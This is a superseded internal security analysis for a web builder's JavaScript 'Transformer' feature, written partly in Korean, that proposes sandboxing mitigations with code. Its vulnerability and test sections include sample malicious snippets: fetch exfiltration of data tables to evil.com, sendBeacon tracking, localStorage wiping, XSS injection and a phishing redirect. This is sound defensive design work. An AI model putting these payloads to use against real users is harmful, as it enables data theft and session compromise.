# Transformer Security Analysis & Solutions

> **Status**: ⚫ **SUPERSEDED — Transformer 3-Level 시스템 전수 제거 (ADR-132 Phase 7, 2026-05-13)**
>
> Transformer 시스템은 외부 caller 0건 검증 후 dead infrastructure 로 판정되어 전수 제거됨 (commit `c52fd344f`, ~800 LOC). 본 문서의 보안 우려 (Level 2 `new Function()` 패턴) 는 더 이상 해당 없음. 향후 데이터 변환 로직 재도입 시 본 문서를 reference 로 활용하되, 새 ADR 발의 후 안전 패턴 (Level 1 mapping 우선 / Web Worker 격리 / WASM sandbox) 채택 필수.
>
> **현재 대체 경로**:
>
> - **Level 1 (노코드 Response Mapping)**: `ApiEndpoint.responseMapping` 필드가 흡수. `src/builder/stores/utils/dataActions.ts:executeApiEndpoint` 의 `endpoint.responseMapping.dataPath` 처리 참조
> - **Level 2/3 (JS / Custom TS)**: 제거됨. 향후 필요 시 별 ADR 재도입
>
> **참조**: [ADR-132](../../adr/completed/132-usecollectiondata-useasynclist-alignment.md) §Phase 7 / [ADR-132 breakdown](../../adr/design/132-usecollectiondata-useasynclist-alignment-breakdown.md) §3 Phase 7
>
> ---
>
> 아래 historical 내용은 ADR-132 Phase 7 이전 시점 (2025-12-05) 의 분석 기록.

> **Status (historical)**: 🔴 Security Issue Identified - Level 2 Transformer uses `new Function()` pattern
>
> **Last Updated (historical)**: 2025-12-05
>
> **Related Files (historical, 모두 ADR-132 Phase 7 에서 제거됨)**:
>
> - `src/builder/stores/utils/dataActions.ts:1066` - Vulnerable code location
> - `src/builder/panels/dataset/components/TransformerList.tsx` - UI component
> - `src/types/builder/data.types.ts` - Type definitions

---

## 📋 Table of Contents

1. [Security Issue Overview](#security-issue-overview)
2. [Current Vulnerability Analysis](#current-vulnerability-analysis)
3. [Solution Options](#solution-options)
4. [Recommended Approach](#recommended-approach)
5. [Implementation Plan](#implementation-plan)
6. [References](#references)

---

## Security Issue Overview

### Current State

The Dataset Panel's **Transformer** system allows users to transform data using JavaScript code. Level 2 (JS Transformer) currently uses the `new Function()` pattern to execute user-provided code, which poses significant security risks.

### Affected Code

**File**: `src/builder/stores/utils/dataActions.ts`

```typescript
case "level2_transformer":
  // Level 2: JS Transformer (로우코드)
  if (transformer.jsTransformer?.code) {
    const fn = new Function("data", "context", transformer.jsTransformer.code);
    result = fn(inputData, context);  // ⚠️ Arbitrary code execution!
  }
  break;
```

**Lines**: 1063-1069

---

## Current Vulnerability Analysis

### 🚨 Critical Security Risks

#### 1. **Code Injection**

```javascript
// Example: Malicious code execution
const maliciousCode = `
  // Delete all localStorage data
  localStorage.clear();

  // Exfiltrate data to external server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(context.dataTables)
  });

  return data; // Return normal data to avoid detection
`;
```

#### 2. **Context Over-Exposure**

```typescript
const context: TransformContext = {
  dataTables: {...},   // ❌ Access to ALL data tables
  variables: {...},    // ❌ Access to ALL variables
  api: {
    fetch: async (url, options) => {...}  // ❌ Arbitrary API calls
  },
  utils: {...}
};
```

#### 3. **DOM Manipulation (XSS)**

```javascript
// Example: XSS attack
const xssCode = `
  document.body.innerHTML = '<script>alert("Hacked")</script>';
  return data;
`;
```

#### 4. **Browser API Abuse**

```javascript
// Example: Browser API abuse
const abuseCode = `
  // Redirect to phishing site
  window.location.href = 'https://phishing.com';

  // Send tracking data
  navigator.sendBeacon('https://tracking.com', JSON.stringify(data));

  return data;
`;
```

### Attack Surface

| Attack Vector           | Risk Level  | Impact                              |
| ----------------------- | ----------- | ----------------------------------- |
| **Code Injection**      | 🔴 Critical | Full system compromise              |
| **Data Exfiltration**   | 🔴 Critical | All DataTables/Variables exposed    |
| **XSS**                 | 🟠 High     | DOM manipulation, session hijacking |
| **API Abuse**           | 🟠 High     | Unauthorized external requests      |
| **LocalStorage Access** | 🟡 Medium   | User data theft                     |

---

## Solution Options

### Option 1: Web Worker Sandbox ⭐ Recommended

**Difficulty**: Medium
**Security Level**: High (90%)
**Implementation Time**: 1-2 days

#### How It Works

```typescript
// 1. Create Worker: src/workers/transformer.worker.ts
/// <reference lib="webworker" />

self.addEventListener("message", (event) => {
  const { code, data, context } = event.data;

  try {
    // Isolated execution environment
    const fn = new Function("data", "context", code);
    const result = fn(data, context);

    self.postMessage({ success: true, result });
  } catch (error) {
    self.postMessage({ success: false, error: error.message });
  }
});

// 2. Use in Store: src/builder/stores/utils/dataActions.ts
import TransformerWorker from "@/workers/transformer.worker.ts?worker";

const worker = new TransformerWorker();

worker.postMessage({ code, data, context });

worker.addEventListener("message", (e) => {
  if (e.data.success) {
    resolve(e.data.result);
  } else {
    reject(new Error(e.data.error));
  }
});
```

#### Pros & Cons

**Pros**:

- ✅ Runs in separate thread (isolated from main thread)
- ✅ No DOM access
- ✅ No localStorage/sessionStorage access
- ✅ Similar pattern to existing iframe isolation
- ✅ Vite auto-bundles workers with `?worker` suffix

**Cons**:

- ⚠️ `fetch` still available (need to remove from context)
- ⚠️ Requires worker lifecycle management

#### Browser Compatibility

| Browser | Minimum Version | Support |
| ------- | --------------- | ------- |
| Chrome  | 4+              | ✅      |
| Firefox | 3.5+            | ✅      |
| Safari  | 4+              | ✅      |
| Edge    | 12+             | ✅      |

**Verdict**: ✅ Universal support - safe to use

---

### Option 2: Context Whitelist ⭐⭐ Easiest

**Difficulty**: Easy
**Security Level**: Medium (50%)
**Implementation Time**: 2-3 hours

#### How It Works

```typescript
// Provide only safe context items
const safeContext = {
  // ❌ Don't expose all dataTables
  // dataTables: {...},

  // ✅ Provide controlled read-only access
  getDataTable: (name: string) => {
    const allowedTables = ['public_table1', 'public_table2'];
    if (!allowedTables.includes(name)) {
      throw new Error(`Access denied: ${name}`);
    }
    // Return deep copy to prevent mutations
    return structuredClone(dataTables.get(name));
  },

  // ❌ Remove api.fetch
  // api: { fetch },

  // ✅ Only safe utilities
  utils: {
    formatDate: (date: string, format: string) => {...},
    formatCurrency: (amount: number, currency: string) => {...},
  }
};

const fn = new Function('data', 'context', code);
result = fn(inputData, safeContext);
```

#### Pros & Cons

**Pros**:

- ✅ Very simple implementation
- ✅ Minimal code changes
- ✅ Controllable context access
- ✅ Can be implemented immediately

**Cons**:

- ⚠️ Still runs in main thread
- ⚠️ DOM access still possible
- ⚠️ Browser APIs still accessible

---

### Option 3: Server-Side Execution

**Difficulty**: High
**Security Level**: Very High (100%)
**Implementation Time**: 1 week+

#### How It Works

```typescript
// Execute transformation on server
const response = await fetch("/api/transform/execute", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    transformerId: id,
    inputData,
  }),
});

const result = await response.json();
```

#### Pros & Cons

**Pros**:

- ✅ Complete isolation from client
- ✅ Server-side code validation possible
- ✅ Rate limiting applicable
- ✅ No client-side security concerns

**Cons**:

- ⚠️ Requires server infrastructure (Node.js/Deno/Cloudflare Workers)
- ⚠️ Network latency
- ⚠️ Server costs
- ⚠️ Requires authentication/authorization

---

### Option 4: iframe Sandbox

**Difficulty**: Medium
**Security Level**: High (85%)
**Implementation Time**: 1-2 days

#### How It Works

```typescript
// Create sandboxed iframe
const iframe = document.createElement("iframe");
iframe.sandbox = "allow-scripts"; // No forms, popups, etc.
iframe.srcdoc = `
  <script>
    window.addEventListener('message', (event) => {
      const { code, data, context } = event.data;
      try {
        const fn = new Function('data', 'context', code);
        const result = fn(data, context);
        parent.postMessage({ success: true, result }, '*');
      } catch (error) {
        parent.postMessage({ success: false, error: error.message }, '*');
      }
    });
  </script>
`;

iframe.contentWindow.postMessage({ code, data, context }, "*");
```

#### Pros & Cons

**Pros**:

- ✅ Strong isolation with `sandbox` attribute
- ✅ Similar pattern to existing Canvas iframe
- ✅ Can restrict specific capabilities

**Cons**:

- ⚠️ DOM overhead (creates iframe element)
- ⚠️ More complex cleanup
- ⚠️ Sandbox restrictions may limit features

---

## Recommended Approach

### 🏆 Hybrid Solution: Web Worker + Context Whitelist

**Phase 1**: Implement Context Whitelist (immediate security improvement)
**Phase 2**: Migrate to Web Worker (complete isolation)

#### Why This Approach?

1. **Quick Wins**: Context Whitelist provides immediate 50% security improvement
2. **Progressive Enhancement**: Web Worker can be added incrementally
3. **No Breaking Changes**: Both approaches are backward compatible
4. **Best Security**: Final state achieves 90%+ security improvement

#### Implementation Steps

```typescript
// Step 1: Context Whitelist (2-3 hours)
const safeContext = {
  getDataTable: (name: string) => {...},  // Controlled access
  utils: { formatDate, formatCurrency },  // Safe utilities only
  // Remove: api.fetch, direct dataTables/variables access
};

// Step 2: Web Worker Migration (1-2 days)
import TransformerWorker from '@/workers/transformer.worker.ts?worker';

const executeTransformer = async (code, data, context) => {
  const worker = new TransformerWorker();

  return new Promise((resolve, reject) => {
    worker.addEventListener('message', (e) => {
      if (e.data.success) {
        resolve(e.data.result);
      } else {
        reject(new Error(e.data.error));
      }
      worker.terminate();
    });

    worker.postMessage({ code, data, context });
  });
};
```

---

## Implementation Plan

### Phase 1: Context Whitelist (Immediate - 2-3 hours)

**Goal**: Reduce attack surface by 50%

| Task                                               | File                                                          | Estimated Time |
| -------------------------------------------------- | ------------------------------------------------------------- | -------------- |
| 1. Create `createSafeContext()` helper             | `src/builder/stores/utils/transformContext.ts`                | 1 hour         |
| 2. Update `executeTransformer` to use safe context | `src/builder/stores/utils/dataActions.ts`                     | 30 min         |
| 3. Add tests for context restrictions              | `src/builder/stores/utils/__tests__/transformContext.test.ts` | 1 hour         |
| 4. Update documentation                            | `CLAUDE.md`, `TRANSFORMER_SECURITY.md`                        | 30 min         |

#### Code Changes

**New File**: `src/builder/stores/utils/transformContext.ts`

```typescript
import type { TransformContext } from "@/types/builder/data.types";

/**
 * Creates a safe, restricted context for transformer execution
 *
 * Security features:
 * - Read-only access to dataTables (via getter function)
 * - Whitelist of allowed tables
 * - No API fetch capability
 * - Only safe utility functions
 */
export function createSafeContext(
  dataTables: Map<string, DataTable>,
  variables: Map<string, Variable>,
  allowedTables: string[] = [],
): TransformContext {
  return {
    // Controlled read-only access
    getDataTable: (name: string) => {
      if (allowedTables.length > 0 && !allowedTables.includes(name)) {
        throw new Error(`Access denied to table: ${name}`);
      }

      const table = dataTables.get(name);
      if (!table) {
        throw new Error(`Table not found: ${name}`);
      }

      // Return deep copy to prevent mutations
      return structuredClone(
        table.useMockData ? table.mockData : table.runtimeData,
      );
    },

    // Read-only variable access
    getVariable: (name: string) => {
      const variable = variables.get(name);
      if (!variable) {
        throw new Error(`Variable not found: ${name}`);
      }
      return structuredClone(variable.defaultValue);
    },

    // Safe utilities only
    utils: {
      formatDate: (date: string, format: string) => {
        // Implementation
      },
      formatCurrency: (amount: number, currency: string) => {
        // Implementation
      },
    },
  };
}
```

**Modified**: `src/builder/stores/utils/dataActions.ts`

```typescript
import { createSafeContext } from './transformContext';

case "level2_transformer":
  if (transformer.jsTransformer?.code) {
    // Use safe context instead of full context
    const safeContext = createSafeContext(
      dataTables,
      variables,
      transformer.allowedTables // Optional: from transformer config
    );

    const fn = new Function('data', 'context', transformer.jsTransformer.code);
    result = fn(inputData, safeContext);
  }
  break;
```

---

### Phase 2: Web Worker Design (Planning - 4 hours)

**Goal**: Design worker architecture

| Task                           | Deliverable           | Estimated Time |
| ------------------------------ | --------------------- | -------------- |
| 1. Worker API design           | Architecture document | 1 hour         |
| 2. Message protocol definition | Protocol spec         | 1 hour         |
| 3. Error handling strategy     | Error handling doc    | 1 hour         |
| 4. Worker lifecycle design     | Lifecycle diagram     | 1 hour         |

---

### Phase 3: Web Worker Implementation (Development - 1 day)

**Goal**: Implement isolated execution environment

| Task                              | File                                               | Estimated Time |
| --------------------------------- | -------------------------------------------------- | -------------- |
| 1. Create transformer worker      | `src/workers/transformer.worker.ts`                | 2 hours        |
| 2. Create worker manager          | `src/utils/transformerWorkerManager.ts`            | 2 hours        |
| 3. Update executeTransformer      | `src/builder/stores/utils/dataActions.ts`          | 1 hour         |
| 4. Add worker tests               | `src/workers/__tests__/transformer.worker.test.ts` | 2 hours        |
| 5. Update Vite config (if needed) | `vite.config.ts`                                   | 30 min         |

#### Key Files

**New File**: `src/workers/transformer.worker.ts`

```typescript
/// <reference lib="webworker" />

interface TransformMessage {
  id: string;
  code: string;
  data: unknown[];
  context: Record<string, unknown>;
}

interface TransformResult {
  id: string;
  success: boolean;
  result?: unknown[];
  error?: string;
}

self.addEventListener("message", (event: MessageEvent<TransformMessage>) => {
  const { id, code, data, context } = event.data;

  try {
    // Execute transformation in isolated worker context
    const fn = new Function("data", "context", code);
    const result = fn(data, context);

    const response: TransformResult = {
      id,
      success: true,
      result: Array.isArray(result) ? result : [result],
    };

    self.postMessage(response);
  } catch (error) {
    const response: TransformResult = {
      id,
      success: false,
      error: error instanceof Error ? error.message : String(error),
    };

    self.postMessage(response);
  }
});
```

**New File**: `src/utils/transformerWorkerManager.ts`

```typescript
import TransformerWorker from "@/workers/transformer.worker.ts?worker";

/**
 * Manages transformer worker lifecycle and execution
 */
export class TransformerWorkerManager {
  private worker: Worker | null = null;
  private pendingRequests = new Map<
    string,
    {
      resolve: (result: unknown[]) => void;
      reject: (error: Error) => void;
    }
  >();

  constructor() {
    this.initWorker();
  }

  private initWorker() {
    this.worker = new TransformerWorker();

    this.worker.addEventListener("message", (event) => {
      const { id, success, result, error } = event.data;

      const pending = this.pendingRequests.get(id);
      if (!pending) return;

      if (success) {
        pending.resolve(result);
      } else {
        pending.reject(new Error(error));
      }

      this.pendingRequests.delete(id);
    });

    this.worker.addEventListener("error", (error) => {
      console.error("[TransformerWorker] Error:", error);
      // Restart worker on critical error
      this.restart();
    });
  }

  async execute(
    code: string,
    data: unknown[],
    context: Record<string, unknown>,
  ): Promise<unknown[]> {
    if (!this.worker) {
      throw new Error("Worker not initialized");
    }

    const id = crypto.randomUUID();

    return new Promise((resolve, reject) => {
      this.pendingRequests.set(id, { resolve, reject });

      // Timeout after 30 seconds
      setTimeout(() => {
        if (this.pendingRequests.has(id)) {
          this.pendingRequests.delete(id);
          reject(new Error("Transformer execution timeout"));
        }
      }, 30000);

      this.worker!.postMessage({ id, code, data, context });
    });
  }

  restart() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null;
    }

    // Reject all pending requests
    for (const [id, pending] of this.pendingRequests.entries()) {
      pending.reject(new Error("Worker restarted"));
      this.pendingRequests.delete(id);
    }

    this.initWorker();
  }

  terminate() {
    if (this.worker) {
      this.worker.terminate();
      this.worker = null;
    }
    this.pendingRequests.clear();
  }
}

// Singleton instance
export const transformerWorkerManager = new TransformerWorkerManager();
```

---

### Phase 4: Migration & Testing (1 day)

**Goal**: Complete migration and validate security

| Task                                          | Estimated Time |
| --------------------------------------------- | -------------- |
| 1. Update all transformer calls to use worker | 2 hours        |
| 2. Add integration tests                      | 2 hours        |
| 3. Security validation tests                  | 2 hours        |
| 4. Performance benchmarking                   | 1 hour         |
| 5. Documentation update                       | 1 hour         |

---

### Phase 5: Level 3 Implementation (Optional - 1 day)

**Goal**: Add TypeScript + external library support

| Task                                  | Estimated Time |
| ------------------------------------- | -------------- |
| 1. Design Level 3 architecture        | 2 hours        |
| 2. Implement TS compilation (esbuild) | 3 hours        |
| 3. Add dependency sandboxing          | 2 hours        |
| 4. Testing & documentation            | 1 hour         |

---

## Security Validation Checklist

After implementing Phase 3 (Web Worker), validate these security improvements:

### ✅ Attack Prevention Tests

```typescript
// Test 1: DOM Access Prevention
const maliciousCode1 = `
  document.body.innerHTML = "Hacked";
  return data;
`;
// Expected: ReferenceError: document is not defined

// Test 2: LocalStorage Access Prevention
const maliciousCode2 = `
  localStorage.clear();
  return data;
`;
// Expected: ReferenceError: localStorage is not defined

// Test 3: Window Access Prevention
const maliciousCode3 = `
  window.location.href = "https://evil.com";
  return data;
`;
// Expected: ReferenceError: window is not defined

// Test 4: Context Restriction
const maliciousCode4 = `
  context.dataTables.delete("important_table");
  return data;
`;
// Expected: TypeError: context.dataTables is not iterable

// Test 5: Fetch Restriction (if context.api removed)
const maliciousCode5 = `
  fetch("https://evil.com", { method: "POST", body: JSON.stringify(data) });
  return data;
`;
// Expected: Works if fetch available in worker (need to remove from context)
```

### ✅ Functional Tests

```typescript
// Test 6: Valid transformation
const validCode = `
  return data
    .filter(item => item.active)
    .map(item => ({
      ...item,
      total: item.price * item.quantity
    }));
`;
// Expected: Success

// Test 7: Context access
const validCode2 = `
  const formatter = context.utils.formatCurrency;
  return data.map(item => ({
    ...item,
    priceFormatted: formatter(item.price, "USD")
  }));
`;
// Expected: Success

// Test 8: Error handling
const invalidCode = `
  return data.map(item => item.nonExistentField.toUpperCase());
`;
// Expected: Graceful error message returned
```

---

## Performance Considerations

### Web Worker Overhead

| Aspect                    | Impact                    | Mitigation                                            |
| ------------------------- | ------------------------- | ----------------------------------------------------- |
| **Message Serialization** | ~1-5ms per transformation | Use Transferable objects for large datasets           |
| **Worker Startup**        | ~10-50ms first time       | Keep worker alive, reuse for multiple transformations |
| **Thread Context Switch** | Minimal (~0.1ms)          | Acceptable for data transformation use case           |

### Recommendations

1. **Worker Pool**: Create worker pool for parallel transformations
2. **Result Caching**: Cache transformation results when input hasn't changed
3. **Lazy Loading**: Only create worker when Level 2 transformer is first used

---

## Migration Path

### For Existing Transformers

All existing Level 2 transformers will continue to work without changes after migration:

1. **Phase 1 (Context Whitelist)**: Backward compatible - only restricts context access
2. **Phase 3 (Web Worker)**: Fully backward compatible - same execution semantics

### Breaking Changes

**None** - The transformation API remains identical:

```typescript
// Before & After - Same API
const result = await executeTransformer(transformerId, inputData);
```

---

## References

### Related Documentation

- [CLAUDE.md](../../../CLAUDE.md) - Project guidelines (Dataset Component section)
- [PLANNED_FEATURES.md](../status/PLANNED.md) - Dataset Component details
- [WEB_BUILDER_DATA_ARCHITECTURE_ANALYSIS.md](../../explanation/architecture/DATA_ARCHITECTURE.md) - Data architecture

### External Resources

- [MDN: Web Workers API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)
- [Vite: Web Worker Support](https://vitejs.dev/guide/features.html#web-workers)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Code References

| File                                                        | Line      | Description                 |
| ----------------------------------------------------------- | --------- | --------------------------- |
| `src/builder/stores/utils/dataActions.ts`                   | 1063-1069 | Current vulnerable code     |
| `src/builder/stores/utils/dataActions.ts`                   | 945-1083  | executeTransformer function |
| `src/builder/panels/dataset/components/TransformerList.tsx` | 1-166     | Transformer UI              |
| `src/types/builder/data.types.ts`                           | -         | Type definitions            |

---

## Status Tracking

| Phase                                  | Status         | Completed Date |
| -------------------------------------- | -------------- | -------------- |
| **Phase 1: Context Whitelist**         | 🔴 Not Started | -              |
| **Phase 2: Web Worker Design**         | 🔴 Not Started | -              |
| **Phase 3: Web Worker Implementation** | 🔴 Not Started | -              |
| **Phase 4: Migration & Testing**       | 🔴 Not Started | -              |
| **Phase 5: Level 3 Implementation**    | 🔴 Not Started | -              |

**Legend**:

- 🔴 Not Started
- 🟡 In Progress
- 🟢 Testing
- ✅ Complete

---

**Last Updated**: 2025-12-05
**Next Review**: After Phase 1 completion
